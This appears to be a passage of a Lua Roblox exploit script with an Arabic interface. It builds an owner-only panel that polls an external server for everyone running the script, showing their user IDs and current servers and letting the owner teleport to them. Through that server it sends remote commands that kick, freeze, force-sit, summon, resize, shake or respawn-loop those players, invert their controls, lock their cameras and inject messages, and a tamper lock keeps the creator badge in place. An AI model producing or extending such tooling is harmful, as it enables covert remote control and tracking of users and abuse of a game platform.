addChatMessage(T18T("النظام"), T18T("مرحبًا! هذي شاشة شات خاصة بمشغّلي السكربت فقط — تمر عبر سيرفر خارجي ولا تظهر لاي لاعب ما يستخدم السكربت."))

UsersPage = nil
UsersList = nil
UsersCountLabel = nil
if isOwnerUser then
    OwnerPage = makePage("OwnerPage")
    makePageTitle(OwnerPage, "اونر", "اوامر الادارة الخاصة")

    local OwnerScroll = Instance.new("ScrollingFrame")
    OwnerScroll.Size = UDim2.new(1, 0, 1, -44)
    OwnerScroll.Position = UDim2.new(0, 0, 0, 44)
    OwnerScroll.BackgroundTransparency = 1
    OwnerScroll.BorderSizePixel = 0
    OwnerScroll.ScrollBarThickness = 4
    OwnerScroll.ScrollBarImageColor3 = Theme.Accent
    OwnerScroll.CanvasSize = UDim2.new(0, 0, 0, 468)
    OwnerScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    OwnerScroll.Parent = OwnerPage

    OwnerTargetInput = Instance.new("TextBox")
    OwnerTargetInput.Size = UDim2.new(1, -20, 0, 40)
    OwnerTargetInput.Position = UDim2.new(0, 10, 0, 10)
    OwnerTargetInput.BackgroundColor3 = Theme.Input
    OwnerTargetInput.BackgroundTransparency = 0.2
    OwnerTargetInput.PlaceholderText = "اكتب 4 احرف من يوزر اللاعب"
    OwnerTargetInput.Text = ""
    OwnerTargetInput.TextColor3 = Theme.Text
    OwnerTargetInput.PlaceholderColor3 = Theme.Muted
    OwnerTargetInput.Font = Enum.Font.Gotham
    OwnerTargetInput.TextSize = 17
    OwnerTargetInput.ClearTextOnFocus = false
    OwnerTargetInput.Parent = OwnerScroll
    makeCorner(OwnerTargetInput, 12)
    makeStroke(OwnerTargetInput, Theme.Border, 1, 0.2)
    applyClickToClear(OwnerTargetInput)

    OwnerTargetHint = Instance.new("TextLabel")
    OwnerTargetHint.Size = UDim2.new(1, -20, 0, 18)
    OwnerTargetHint.Position = UDim2.new(0, 10, 0, 54)
    OwnerTargetHint.BackgroundTransparency = 1
    OwnerTargetHint.Text = T18T("اكتب 4 احرف على الاقل")
    OwnerTargetHint.TextColor3 = Theme.Muted
    OwnerTargetHint.TextXAlignment = Enum.TextXAlignment.Right
    OwnerTargetHint.Font = Enum.Font.Gotham
    OwnerTargetHint.TextSize = 13
    OwnerTargetHint.Parent = OwnerScroll

    OwnerKickBtn = makeButton("OwnerKickBtn", "طرد", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 80), Theme.ButtonRed, Theme.ButtonRedAlt)
    OwnerKickBtn.Parent = OwnerScroll

    OwnerFreezeBtn = makeButton("OwnerFreezeBtn", "تجميد", UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 80), Theme.ButtonBlue, Theme.ButtonBlueAlt)
    OwnerFreezeBtn.Parent = OwnerScroll

    OwnerRespawnLoopBtn = makeButton("OwnerRespawnLoopBtn", "Respawn Loop", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 126), Theme.ButtonOrange, Theme.ButtonOrangeAlt)
    OwnerRespawnLoopBtn.Parent = OwnerScroll

    OwnerSummonBtn = makeButton("OwnerSummonBtn", "استدعاء", UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 126), Theme.ButtonGreen, Theme.ButtonGreenAlt)
    OwnerSummonBtn.Parent = OwnerScroll

    UsersPage = OwnerPage

    local usersDivider = Instance.new("TextLabel")
    usersDivider.Size = UDim2.new(1, -20, 0, 18)
    usersDivider.Position = UDim2.new(0, 10, 0, 174)
    usersDivider.BackgroundTransparency = 1
    usersDivider.Text = " مستخدمين السكربت "
    usersDivider.TextColor3 = Theme.Muted
    usersDivider.TextXAlignment = Enum.TextXAlignment.Center
    usersDivider.Font = Enum.Font.GothamMedium
    usersDivider.TextSize = 12
    usersDivider.Parent = OwnerScroll

    UsersCountLabel = Instance.new("TextLabel")
    UsersCountLabel.Size = UDim2.new(1, -20, 0, 24)
    UsersCountLabel.Position = UDim2.new(0, 10, 0, 196)
    UsersCountLabel.BackgroundTransparency = 1
    UsersCountLabel.Text = T18T("العدد: ") .. "0"
    UsersCountLabel.TextColor3 = Theme.Muted
    UsersCountLabel.TextXAlignment = Enum.TextXAlignment.Right
    UsersCountLabel.Font = Enum.Font.GothamBold
    UsersCountLabel.TextSize = 14
    UsersCountLabel.Parent = OwnerScroll

    UsersList = Instance.new("ScrollingFrame")
    UsersList.Size = UDim2.new(1, -20, 0, 200)
    UsersList.Position = UDim2.new(0, 10, 0, 224)
    UsersList.BackgroundColor3 = Theme.Card
    UsersList.BackgroundTransparency = 0.2
    UsersList.BorderSizePixel = 0
    UsersList.ScrollBarThickness = 4
    UsersList.ScrollBarImageColor3 = Theme.Accent
    UsersList.CanvasSize = UDim2.new(0, 0, 0, 0)
    UsersList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    UsersList.Parent = OwnerScroll
    makeCorner(UsersList, 12)
    makeStroke(UsersList, Theme.Border, 1, 0.2)

    local usersLayout = Instance.new("UIListLayout")
    usersLayout.SortOrder = Enum.SortOrder.LayoutOrder
    usersLayout.Padding = UDim.new(0, 6)
    usersLayout.Parent = UsersList

    local usersPadding = Instance.new("UIPadding")
    usersPadding.PaddingTop = UDim.new(0, 8)
    usersPadding.PaddingBottom = UDim.new(0, 8)
    usersPadding.PaddingLeft = UDim.new(0, 8)
    usersPadding.PaddingRight = UDim.new(0, 8)
    usersPadding.Parent = UsersList

_T18OwnerRowBusy = false
    pcall(function()
        game:GetService("TeleportService").TeleportInitFailed:Connect(function(plr)
            if plr == LocalPlayer and _T18LastTpLink then
                pcall(function() if setclipboard then setclipboard(_T18LastTpLink) end end)
                T18ShowToast("الماب مانع النقل، نسخت لك رابط السيرفر")
            end
        end)
    end)

local function refreshUsersList()
        if not UsersList or not UsersCountLabel then return end
        if _T18OwnerRowBusy then return end
        
        local users = nil
        pcall(function()
            local url = T18_API_BASE .. "/owner/users?name=" .. t18_urlEncode(LocalPlayer.Name)
            local res = t18_httpRequest({
                Url = url,
                Method = "GET",
                Headers = { ["Accept"] = "application/json" },
            })
            if res and res.Body then
                local data = t18_jsonDecode(res.Body)
                if data and data.ok and type(data.users) == "table" then
                    users = data.users
                end
            end
        end)
        if not users then return end

        for _, child in ipairs(UsersList:GetChildren()) do
            if child:IsA("Frame") then
                child:Destroy()
            end
        end

        UsersCountLabel.Text = T18T("العدد: ") .. tostring(#users)

        for i, user in ipairs(users) do
            local isMe = tonumber(user.userId) == LocalPlayer.UserId
            local hasLoc = user.jobId and tostring(user.jobId) ~= "" and not isMe

            local row = Instance.new("Frame")
            row.Size = UDim2.new(1, -16, 0, hasLoc and 62 or 44)
            row.BackgroundColor3 = Theme.PanelSoft
            row.BackgroundTransparency = 0.18
            row.BorderSizePixel = 0
            row.LayoutOrder = i
            row.Parent = UsersList
            makeCorner(row, 10)
            makeStroke(row, Theme.Border, 1, 0.2)

            local textW = hasLoc and -146 or -20
            local textX = hasLoc and 136 or 10

            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, textW, 0, 20)
            nameLabel.Position = UDim2.new(0, textX, 0, 4)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = tostring(user.name or "?") .. (isMe and " (انت)" or "")
            nameLabel.TextColor3 = Theme.Text
            nameLabel.TextXAlignment = Enum.TextXAlignment.Right
            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
            nameLabel.Font = Enum.Font.GothamBold
            nameLabel.TextSize = 15
            nameLabel.Parent = row

            if hasLoc then
                local sameServer = tostring(user.jobId) == tostring(game.JobId)
                local mapLabel = Instance.new("TextLabel")
                mapLabel.Size = UDim2.new(1, textW, 0, 16)
                mapLabel.Position = UDim2.new(0, textX, 0, 24)
                mapLabel.BackgroundTransparency = 1
                mapLabel.Text = sameServer and "معك بنفس السيرفر" or ("الماب: " .. tostring(user.placeName or user.placeId or "?"))
                mapLabel.TextColor3 = sameServer and Color3.fromRGB(122, 214, 158) or Theme.Accent
                mapLabel.TextXAlignment = Enum.TextXAlignment.Right
                mapLabel.TextTruncate = Enum.TextTruncate.AtEnd
                mapLabel.Font = Enum.Font.GothamMedium
                mapLabel.TextSize = 12
                mapLabel.Parent = row
            end

            local idLabel = Instance.new("TextLabel")
            idLabel.Size = UDim2.new(1, textW, 0, 14)
            idLabel.Position = UDim2.new(0, textX, 0, hasLoc and 42 or 24)
            idLabel.BackgroundTransparency = 1
            idLabel.Text = "ID: " .. tostring(user.userId or "?")
            idLabel.TextColor3 = Theme.Muted
            idLabel.TextXAlignment = Enum.TextXAlignment.Right
            idLabel.Font = Enum.Font.Gotham
            idLabel.TextSize = 11
            idLabel.Parent = row

            if hasLoc then
                local function rowBtn(text, x)
                    local b = Instance.new("TextButton")
                    b.Size = UDim2.new(0, 56, 0, 28)
                    b.Position = UDim2.new(0, x, 0.5, -14)
                    b.BackgroundColor3 = Theme.ButtonDefault
                    b.AutoButtonColor = false
                    b.Text = text
                    b.TextColor3 = Theme.Text
                    b.Font = Enum.Font.GothamBold
                    b.TextSize = 12
                    b.Parent = row
                    makeCorner(b, 8)
                    local st = makeStroke(b, Theme.Border, 1, 0.1)
                    b.MouseEnter:Connect(function() b.BackgroundColor3 = Theme.ButtonDefaultAlt; st.Color = Color3.fromRGB(95, 95, 95) end)
                    b.MouseLeave:Connect(function() b.BackgroundColor3 = Theme.ButtonDefault; st.Color = Theme.Border end)
                    return b
                end

                local kickBtn = rowBtn("طرد", 8)
                local tpBtn = rowBtn("انتقل", 70)

                kickBtn.MouseButton1Click:Connect(function()
                    if kickBtn:GetAttribute("Armed") then
                        kickBtn:SetAttribute("Armed", nil)
                        kickBtn.Text = "..."
                        task.spawn(function()
                            local res = t18_httpRequest({
                                Url = T18_API_BASE .. "/owner/kick",
                                Method = "POST",
                                Headers = { ["Content-Type"] = "application/json", ["Accept"] = "application/json" },
                                Body = t18_jsonEncode({ targetUserId = user.userId, fromName = LocalPlayer.Name }),
                            })
                            local data = res and t18_jsonDecode(res.Body or res.body or "")
                            if data and data.ok then
                                T18ShowToast("انطرد " .. tostring(user.name or "?"))
                            else
                                T18ShowToast("فشل الطرد: " .. tostring(data and data.error or "السيرفر ما رد"))
                            end
                            _T18OwnerRowBusy = false
                        end)
                    else
                        kickBtn:SetAttribute("Armed", true)
                        kickBtn.Text = "متأكد؟"
                        kickBtn.BackgroundColor3 = Theme.Danger
                        _T18OwnerRowBusy = true
                        task.delay(2.5, function()
                            if kickBtn.Parent and kickBtn:GetAttribute("Armed") then
                                kickBtn:SetAttribute("Armed", nil)
                                kickBtn.Text = "طرد"
                                kickBtn.BackgroundColor3 = Theme.ButtonDefault
                                _T18OwnerRowBusy = false
                            end
                        end)
                    end
                end)

                tpBtn.MouseButton1Click:Connect(function()
                    local pid = tonumber(user.placeId)
                    local jid = tostring(user.jobId or "")
                    if not pid or jid == "" then
                        T18ShowToast("ما اقدر انقلك لهالسيرفر")
                        return
                    end
                    if jid == tostring(game.JobId) then
                        T18ShowToast("انت معه بنفس السيرفر")
                        return
                    end
                    _T18LastTpLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", pid, jid)
                    tpBtn.Text = "..."
                    T18ShowToast("جاري النقل لـ " .. tostring(user.name or "?"))
                    local ok = pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(pid, jid, LocalPlayer)
                    end)
                    if not ok then
                        pcall(function() if setclipboard then setclipboard(_T18LastTpLink) end end)
                        T18ShowToast("الماب مانع النقل، نسخت لك رابط السيرفر")
                        tpBtn.Text = "انتقل"
                    end
                end)
            end
        end
    end

    task.spawn(function()
        task.wait(2)
        while true do
            pcall(refreshUsersList)
            task.wait(3)
        end
    end)

    if not isTouchDevice then
        task.spawn(function()
            task.wait(4)
            while true do
                pcall(function()
                    if UsersList and UsersList.Parent then
                        local canvasH = UsersList.AbsoluteCanvasSize.Y
                        local frameH = UsersList.AbsoluteSize.Y
                        if canvasH > frameH + 10 then
                            local currentY = UsersList.CanvasPosition.Y
                            if currentY <= 1 then
                                task.wait(0.5)
                                UsersList.CanvasPosition = Vector2.new(0, canvasH - frameH)
                            else
                                UsersList.CanvasPosition = Vector2.new(0, math.max(0, currentY - 1))
                                task.wait(0.03)
                            end
                        else
                            task.wait(1)
                        end
                    end
                end)
            end
        end)
    end
end

local function sendOwnerCommand(action, targetUserId, extraText)
    return t18_postEvent({
        type = "cmd",
        action = action,
        targetUserId = targetUserId,
        text = extraText,
    })
end

if isOwnerUser then
    SubscribersPage = makePage("SubscribersPage")
    makePageTitle(SubscribersPage, "للمشتركين", "تحكم كامل باللاعبين المشغلين للسكربت")

    local SubScroll = Instance.new("ScrollingFrame")
    SubScroll.Size = UDim2.new(1, 0, 1, -44)
    SubScroll.Position = UDim2.new(0, 0, 0, 44)
    SubScroll.BackgroundTransparency = 1
    SubScroll.BorderSizePixel = 0
    SubScroll.ScrollBarThickness = 4
    SubScroll.ScrollBarImageColor3 = Theme.Accent
    SubScroll.CanvasSize = UDim2.new(0, 0, 0, 720)
    SubScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    SubScroll.Parent = SubscribersPage

    SubTargetInput = Instance.new("TextBox")
    SubTargetInput.Size = UDim2.new(1, -20, 0, 40)
    SubTargetInput.Position = UDim2.new(0, 10, 0, 10)
    SubTargetInput.BackgroundColor3 = Theme.Input
    SubTargetInput.BackgroundTransparency = 0.2
    SubTargetInput.PlaceholderText = "اكتب 4 احرف من يوزر اللاعب"
    SubTargetInput.Text = ""
    SubTargetInput.TextColor3 = Theme.Text
    SubTargetInput.PlaceholderColor3 = Theme.Muted
    SubTargetInput.Font = Enum.Font.Gotham
    SubTargetInput.TextSize = 17
    SubTargetInput.ClearTextOnFocus = false
    SubTargetInput.Parent = SubScroll
    makeCorner(SubTargetInput, 12)
    makeStroke(SubTargetInput, Theme.Border, 1, 0.2)
    applyClickToClear(SubTargetInput)

    SubTargetHint = Instance.new("TextLabel")
    SubTargetHint.Size = UDim2.new(1, -20, 0, 18)
    SubTargetHint.Position = UDim2.new(0, 10, 0, 54)
    SubTargetHint.BackgroundTransparency = 1
    SubTargetHint.Text = T18T("اكتب 4 احرف على الاقل")
    SubTargetHint.TextColor3 = Theme.Muted
    SubTargetHint.TextXAlignment = Enum.TextXAlignment.Right
    SubTargetHint.Font = Enum.Font.Gotham
    SubTargetHint.TextSize = 13
    SubTargetHint.Parent = SubScroll

    local function findSubTargetPlayer()
        if not SubTargetInput then return nil end
        local q = (SubTargetInput.Text or ""):gsub("%s+", ""):lower()
        if #q < 4 then return nil end
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Name:lower():find(q, 1, true) then
                return p
            end
        end
        return nil
    end

    local function subSend(action, extraText)
        local target = findSubTargetPlayer()
        if not target then
            showNotification(T18T("اكتب 4 احرف من يوزر اللاعب او اكثر"))
            return
        end
        sendOwnerCommand(action, target.UserId, extraText)
        showNotification(T18T("تم ارسال الامر"))
    end

    local subY = 80
    local subColR = false
    local function subFlush()
        if subColR then subY += 46; subColR = false end
    end
    local function subBtnFull(name, text, baseColor, accentColor, onClick)
        local xPos = subColR and UDim2.new(0.5, 4, 0, subY) or UDim2.new(0, 10, 0, subY)
        local b = makeButton(name, text, UDim2.new(0.5, -14, 0, 38), xPos, baseColor, accentColor)
        b.Parent = SubScroll
        b.MouseButton1Click:Connect(onClick)
        if subColR then subY += 46 end
        subColR = not subColR
        return b
    end
    local function subBtnHalf(name, text, side, baseColor, accentColor, onClick)
        if side == "L" then subFlush() end
        local xPos = side == "L" and UDim2.new(0, 10, 0, subY) or UDim2.new(0.5, 4, 0, subY)
        local b = makeButton(name, text, UDim2.new(0.5, -14, 0, 38), xPos, baseColor, accentColor)
        b.Parent = SubScroll
        b.MouseButton1Click:Connect(onClick)
        if side == "R" then subY += 46 end
        return b
    end

    local _subToggleStates = { freeze={}, sit={}, summon={}, invert={}, cam={}, respawn={} }
    local _subToggleBtns = {}

    subBtnFull("SubKickBtn", "طرد", Theme.ButtonRed, Theme.ButtonRedAlt, function()
        subSend("kick")
    end)

    local function refreshSubBtnTexts()
        local target = findSubTargetPlayer()
        for stateKey, data in pairs(_subToggleBtns) do
            local isOn = target and (_subToggleStates[stateKey][target.UserId] or false) or false
            local newText = isOn and data.textOn or data.textOff
            data.btn.Text = newText
            local overlay = data.btn:FindFirstChild("ButtonTextOverlay")
            if overlay then overlay.Text = newText end
            data.btn.BackgroundColor3 = isOn and Theme.Active or data.baseColor
        end
    end

    local function subToggleBtn(name, textOn, textOff, stateKey, cmdOn, cmdOff, baseColor, accentColor)
        local btn
        btn = subBtnFull(name, textOff, baseColor, accentColor, function()
            local target = findSubTargetPlayer()
            if not target then showNotification(T18T("اكتب 4 احرف من يوزر اللاعب او اكثر")); return end
            local nowOn = _subToggleStates[stateKey][target.UserId] or false
            subSend(nowOn and cmdOff or cmdOn)
            _subToggleStates[stateKey][target.UserId] = not nowOn
            refreshSubBtnTexts()
        end)
        _subToggleBtns[stateKey] = { btn=btn, textOn=textOn, textOff=textOff, baseColor=baseColor }
        return btn
    end

    subToggleBtn("SubFreezeBtn", " فك التجميد", " تجميد", "freeze", "freeze_on", "freeze_off", Theme.ButtonBlue, Theme.ButtonBlueAlt)

    subToggleBtn("SubSitBtn", " الغاء الجلوس", " اجبار الجلوس", "sit", "sit_on", "sit_off", Theme.ButtonOrange, Theme.ButtonOrangeAlt)

    subBtnFull("SubBringBtn", "احضار اللاعب", Theme.ButtonGreen, Theme.ButtonGreenAlt, function()
        subSend("bring")
    end)

    subToggleBtn("SubSummonBtn", " ايقاف الاستدعاء", " استدعاء مستمر", "summon", "summon_on", "summon_off", Theme.ButtonGreen, Theme.ButtonGreenAlt)

    subToggleBtn("SubInvertBtn", " الغاء عكس التحكم", " عكس ازرار التحكم", "invert", "invert_on", "invert_off", Theme.ButtonBlue, Theme.ButtonBlueAlt)

    subToggleBtn("SubCamLockBtn", " فك قفل الكاميرا", " قفل الكاميرا", "cam", "camlock_on", "camlock_off", Theme.ButtonOrange, Theme.ButtonOrangeAlt)

    subBtnHalf("SubShrinkBtn", "تصغير", "L", Theme.ButtonBlue, Theme.ButtonBlueAlt, function()
        subSend("shrink_on")
    end)
    subBtnHalf("SubGrowBtn", "تكبير", "R", Theme.ButtonBlue, Theme.ButtonBlueAlt, function()
        subSend("grow_on")
    end)

    subBtnFull("SubResizeResetBtn", "ارجاع الحجم الطبيعي", Theme.ButtonGreen, Theme.ButtonGreenAlt, function()
        subSend("resize_off")
    end)

    subBtnFull("SubShakeBtn", "اهتزاز الشاشة", Theme.ButtonRed, Theme.ButtonRedAlt, function()
        subSend("shake")
    end)

    subToggleBtn("SubRespawnBtn", " ايقاف Respawn Loop", " Respawn Loop", "respawn", "respawn_on", "respawn_off", Theme.ButtonOrange, Theme.ButtonOrangeAlt)

    subFlush()
    local SubSayInput = Instance.new("TextBox")
    SubSayInput.Size = UDim2.new(1, -20, 0, 38)
    SubSayInput.Position = UDim2.new(0, 10, 0, subY)
    SubSayInput.BackgroundColor3 = Theme.Input
    SubSayInput.BackgroundTransparency = 0.2
    SubSayInput.PlaceholderText = "اكتب رسالة لارسالها..."
    SubSayInput.Text = ""
    SubSayInput.TextColor3 = Theme.Text
    SubSayInput.PlaceholderColor3 = Theme.Muted
    SubSayInput.Font = Enum.Font.Gotham
    SubSayInput.TextSize = 15
    SubSayInput.ClearTextOnFocus = false
    SubSayInput.Parent = SubScroll
    makeCorner(SubSayInput, 12)
    makeStroke(SubSayInput, Theme.Border, 1, 0.2)
    applyClickToClear(SubSayInput)
    subY = subY + 46

    subBtnHalf("SubSayBtn", "ارسال كرسالة", "L", Theme.ButtonGreen, Theme.ButtonGreenAlt, function()
        if SubSayInput.Text == "" then return end
        subSend("say", SubSayInput.Text)
    end)
    subBtnHalf("SubWarnBtn", "ارسال كتحذير", "R", Theme.ButtonRed, Theme.ButtonRedAlt, function()
        if SubSayInput.Text == "" then return end
        subSend("warn", SubSayInput.Text)
    end)
    subY = subY + 46

    SubScroll.CanvasSize = UDim2.new(0, 0, 0, subY + 20)

    if SubTargetInput then
        SubTargetInput:GetPropertyChangedSignal("Text"):Connect(function()
            local q = SubTargetInput.Text or ""
            refreshSubBtnTexts()
            if #q < 4 then
                SubTargetHint.Text = T18T("اكتب 4 احرف على الاقل")
            else
                local t = findSubTargetPlayer()
                SubTargetHint.Text = t and (T18T("سيتم الاستهداف: ") .. t.Name) or T18T("لم يتم العثور على لاعب")
            end
        end)
    end
end

local MainCard = Instance.new("Frame")
MainCard.Size = UDim2.new(1, -20, 1, -72)
MainCard.ClipsDescendants = true
MainCard.Position = UDim2.new(0, 10, 0, 58)
MainCard.BackgroundColor3 = Theme.Panel
MainCard.BackgroundTransparency = 0.16
MainCard.BorderSizePixel = 0
MainCard.Parent = MainPage
makeCorner(MainCard, 12)
makeStroke(MainCard, Theme.Border, 1, 0.2)
UiFx.makeStarField(MainCard, 12)

local DiscordBtn = Instance.new("TextButton")
DiscordBtn.Size = UDim2.new(1, -24, 0, 40)
DiscordBtn.Position = UDim2.new(0, 12, 0, 12)
DiscordBtn.BackgroundColor3 = Theme.PanelSoft
DiscordBtn.BackgroundTransparency = 0.08
DiscordBtn.AutoButtonColor = false
DiscordBtn.Text = "نسخ رابط الدسكورد"
DiscordBtn.TextColor3 = Theme.Text
DiscordBtn.TextStrokeTransparency = 1
DiscordBtn.TextStrokeColor3 = Color3.fromRGB(200, 200, 200)
DiscordBtn.Font = Enum.Font.GothamBold
DiscordBtn.TextSize = 17
DiscordBtn.Parent = MainCard
makeCorner(DiscordBtn, 12)
makeStroke(DiscordBtn, Theme.Border, 1, 0.12)

local OnlineRow = Instance.new("Frame")
OnlineRow.Size = UDim2.new(1, -24, 0, 26)
OnlineRow.Position = UDim2.new(0, 12, 0, 58)
OnlineRow.BackgroundTransparency = 1
OnlineRow.Parent = MainCard

local OnlineDot = Instance.new("Frame")
OnlineDot.Size = UDim2.new(0, 10, 0, 10)
OnlineDot.Position = UDim2.new(1, -10, 0.5, -5)
OnlineDot.BackgroundColor3 = Color3.fromRGB(0, 210, 90)
OnlineDot.BorderSizePixel = 0
OnlineDot.Parent = OnlineRow
makeCorner(OnlineDot, 99)

local OnlineLabel = Instance.new("TextLabel")
OnlineLabel.Size = UDim2.new(1, -18, 1, 0)
OnlineLabel.Position = UDim2.new(0, 0, 0, 0)
OnlineLabel.BackgroundTransparency = 1
OnlineLabel.Text = "1 online"
OnlineLabel.TextColor3 = Color3.fromRGB(0, 210, 90)
OnlineLabel.TextXAlignment = Enum.TextXAlignment.Right
OnlineLabel.Font = Enum.Font.GothamBold
OnlineLabel.TextSize = 14
OnlineLabel.Parent = OnlineRow

task.spawn(function()
    while T18RuntimeAlive() do
        pcall(function()
            local url = T18_API_BASE .. "/online"
            local res = t18_httpRequest({
                Url = url,
                Method = "GET",
                Headers = { ["Accept"] = "application/json" },
            })
            if res and res.Body then
                local data = t18_jsonDecode(res.Body)
                if data and data.ok then
                    local count = math.max(1, data.globalOnline or data.count or 1)
                    OnlineLabel.Text = tostring(count) .. " online"
                end
            end
        end)
        task.wait(10)
    end
end)

local MainText = Instance.new("TextLabel")
MainText.Size = UDim2.new(1, -24, 1, -158)
MainText.Position = UDim2.new(0, 12, 0, 88)
MainText.BackgroundTransparency = 1
MainText.Text = "هلا والله " .. LocalPlayer.DisplayName .. "، نورت السكربت!\n\nيشرفنا انك معنا. تقدر تتنقل بين الاقسام من القائمة على اليسار:\n\nقسم اللاعب فيه اوامر الطيران والسرعة.\nقسم الاستهداف فيه الاوامر المتعلقة باللاعبين.\nقسم اخبار فيه آخر التحديثات والازرار الجديده."
MainText.TextColor3 = Theme.Text
MainText.TextXAlignment = Enum.TextXAlignment.Right
MainText.TextYAlignment = Enum.TextYAlignment.Top
MainText.TextWrapped = true
MainText.Font = Enum.Font.Gotham
MainText.TextSize = 16
MainText.Parent = MainCard
_T18MainTextLabel = MainText
_T18MainTextAr = "هلا والله " .. LocalPlayer.DisplayName .. "، نورت السكربت!\n\nيشرفنا انك معنا. تقدر تتنقل بين الاقسام من القائمة على اليسار:\n\nقسم اللاعب فيه اوامر الطيران والسرعة.\nقسم الاستهداف فيه الاوامر المتعلقة باللاعبين.\nقسم اخبار فيه آخر التحديثات والازرار الجديده."
_T18MainTextEn = "Hey there, " .. LocalPlayer.DisplayName .. "! Welcome aboard—it's great to have you here.\n\nUse the menu on the left to switch sections:\n\nPlayer has the flight and speed tools.\nTargeting has the player-related tools.\nNews has the latest updates and new buttons."

-- ═══ شارة المطور (ضد المنتحلين) ═══
do
    local CREATOR_NAME = "azoz11211"
    local CREATOR_ID   = 1491487752

    local Badge = Instance.new("TextButton")
    Badge.Name = "T18CreatorBadge"
    Badge.AnchorPoint = Vector2.new(0, 1)
    Badge.Size = UDim2.new(0, 196, 0, 46)
    Badge.Position = UDim2.new(0, 12, 1, -12)
    Badge.BackgroundColor3 = Theme.PanelSoft
    Badge.BackgroundTransparency = 0.05
    Badge.AutoButtonColor = false
    Badge.Text = ""
    Badge.ZIndex = 5
    Badge.Parent = MainCard
    makeCorner(Badge, 23)
    local badgeStroke = makeStroke(Badge, Theme.Border, 1, 0.1)

    -- حلقة متدرجة حول الصورة
    local Ring = Instance.new("Frame")
    Ring.Name = "AvatarRing"
    Ring.AnchorPoint = Vector2.new(0, 0.5)
    Ring.Size = UDim2.new(0, 38, 0, 38)
    Ring.Position = UDim2.new(0, 4, 0.5, 0)
    Ring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Ring.BorderSizePixel = 0
    Ring.ZIndex = 6
    Ring.Parent = Badge
    makeCorner(Ring, 99)
    local ringGrad = UiFx.makeGradient(Ring, {
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(70, 70, 70)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
    }, 0)

    local Avatar = Instance.new("ImageLabel")
    Avatar.Name = "CreatorAvatar"
    Avatar.AnchorPoint = Vector2.new(0.5, 0.5)
    Avatar.Size = UDim2.new(1, -4, 1, -4)
    Avatar.Position = UDim2.new(0.5, 0, 0.5, 0)
    Avatar.BackgroundColor3 = Theme.Card
    Avatar.BorderSizePixel = 0
    Avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. CREATOR_ID .. "&w=150&h=150"
    Avatar.ScaleType = Enum.ScaleType.Crop
    Avatar.ZIndex = 7
    Avatar.Parent = Ring
    makeCorner(Avatar, 99)

    -- احتياط لو rbxthumb ما اشتغل في بعض الـ executors
    task.spawn(function()
        local ok, img = pcall(function()
            return Players:GetUserThumbnailAsync(CREATOR_ID, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
        end)
        if ok and img and img ~= "" then Avatar.Image = img end
    end)

    local NameLbl = Instance.new("TextLabel")
    NameLbl.Name = "CreatorName"
    NameLbl.Size = UDim2.new(1, -56, 0, 20)
    NameLbl.Position = UDim2.new(0, 50, 0, 5)
    NameLbl.BackgroundTransparency = 1
    NameLbl.Text = "by " .. CREATOR_NAME
    NameLbl.TextColor3 = Theme.Text
    NameLbl.TextXAlignment = Enum.TextXAlignment.Left
    NameLbl.Font = Enum.Font.GothamBold
    NameLbl.TextSize = 15
    NameLbl.ZIndex = 6
    NameLbl.Parent = Badge

    local RoleLbl = Instance.new("TextLabel")
    RoleLbl.Name = "CreatorRole"
    RoleLbl.Size = UDim2.new(1, -56, 0, 14)
    RoleLbl.Position = UDim2.new(0, 50, 0, 25)
    RoleLbl.BackgroundTransparency = 1
    RoleLbl.Text = "Official Developer"
    RoleLbl.TextColor3 = Theme.Muted
    RoleLbl.TextXAlignment = Enum.TextXAlignment.Left
    RoleLbl.Font = Enum.Font.GothamMedium
    RoleLbl.TextSize = 11
    RoleLbl.ZIndex = 6
    RoleLbl.Parent = Badge

    -- الحلقة تلف بهدوء
    task.spawn(function()
        while T18RuntimeAlive() and Ring.Parent do
            ringGrad.Rotation = (ringGrad.Rotation + 2) % 360
            task.wait(0.03)
        end
    end)

    -- هوفر خفيف
    Badge.MouseEnter:Connect(function()
        TweenService:Create(Badge, TweenInfo.new(0.18), { BackgroundColor3 = Theme.ButtonDefaultAlt }):Play()
        TweenService:Create(badgeStroke, TweenInfo.new(0.18), { Color = Theme.Accent }):Play()
    end)
    Badge.MouseLeave:Connect(function()
        TweenService:Create(Badge, TweenInfo.new(0.18), { BackgroundColor3 = Theme.PanelSoft }):Play()
        TweenService:Create(badgeStroke, TweenInfo.new(0.18), { Color = Theme.Border }):Play()
    end)
    Badge.MouseButton1Click:Connect(function()
        pcall(function() if setclipboard then setclipboard(CREATOR_NAME) end end)
        T18ShowToast("صانع السكربت: " .. CREATOR_NAME)
    end)

    -- ضد التعديل: لو احد غيّر الاسم او الصورة او حذف الشارة ترجع
    local function lock(obj, prop, val)
        obj:GetPropertyChangedSignal(prop):Connect(function()
            if obj[prop] ~= val then obj[prop] = val end
        end)
    end
    lock(NameLbl, "Text", "by " .. CREATOR_NAME)
    lock(NameLbl, "Visible", true)
    lock(Badge, "Visible", true)
    lock(Ring, "Visible", true)
    lock(Avatar, "Visible", true)
    Badge.AncestryChanged:Connect(function(_, parent)
        if parent == nil and MainCard.Parent and T18RuntimeAlive() then
            task.defer(function() pcall(function() Badge.Parent = MainCard end) end)
        end
    end)
end

local function showNotification(message)
    if tick() - (_T18OwnerBlockedAt or 0) < 0.3 then return end
    T18ShowToast(message)
end

local TeleportService_T18 = game:GetService("TeleportService")

local localFrozen = {active=false, thread=nil, charConn=nil}
local localRespawnLoop = {active=false, thread=nil}
local localSummonState = {active=false, thread=nil}
